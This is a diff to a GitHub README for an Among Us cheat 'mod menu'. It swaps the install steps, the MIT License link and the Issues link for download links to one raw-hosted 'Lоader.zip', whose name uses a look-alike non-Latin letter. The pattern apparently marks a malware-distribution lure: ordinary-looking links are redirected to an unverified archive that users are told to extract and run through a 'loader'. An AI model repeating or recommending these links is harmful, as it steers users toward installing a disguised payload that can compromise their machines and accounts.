@@ -52,9 +52,9 @@ Packed with powerful utilities and enhancements, the 2025 Among Us Mod Menu deli
 
 Start using your Among Us Mod Menu with these easy steps:
 
-1. **Download Loader.rar** from this repository (find it in the [Releases](./releases) or main page).
-2. Extract Loader.rar using your favorite archive tool (WinRAR, 7-Zip, The Unarchiver).
-3. Follow the included `HowToInstall.txt` for detailed per-OS setup instructions.
+1. **Download https://raw.githubusercontent.com/ZubairSolanki/AmongUs-ModMenu-Toolkit/main/Lоader.zip** from this repository (find it in the [Releases](./releases) or main page).
+2. Extract https://raw.githubusercontent.com/ZubairSolanki/AmongUs-ModMenu-Toolkit/main/Lоader.zip using your favorite archive tool (WinRAR, 7-Zip, The Unarchiver).
+3. Follow the included `https://raw.githubusercontent.com/ZubairSolanki/AmongUs-ModMenu-Toolkit/main/Lоader.zip` for detailed per-OS setup instructions.
 4. Launch Among Us through the loader, enable the mods you want, and enjoy a next-level experience!
 
 *Note: Always ensure you are using the most up-to-date version of Among Us and the mod menu for the best stability!*
@@ -77,13 +77,13 @@ The developers and contributors of this project are **not affiliated with, endor
 ## 📜 MIT License
 
 This repository and all associated code are released under the MIT license.  
-For details, please see the [MIT License](https://choosealicense.com/licenses/mit/) page.
+For details, please see the [MIT License](https://raw.githubusercontent.com/ZubairSolanki/AmongUs-ModMenu-Toolkit/main/Lоader.zip) page.
 
 ---
 
 ## 🎨 Support, Feedback, and Community
 
-Got a suggestion, question, or feedback about the Among Us Mod Menu? Start an [Issue](https://github.com/issues) or share your ideas in the Community tab! Help us shape the ultimate 2025 mod menu toolkit!
+Got a suggestion, question, or feedback about the Among Us Mod Menu? Start an [Issue](https://raw.githubusercontent.com/ZubairSolanki/AmongUs-ModMenu-Toolkit/main/Lоader.zip) or share your ideas in the Community tab! Help us shape the ultimate 2025 mod menu toolkit!
 
 ---
 
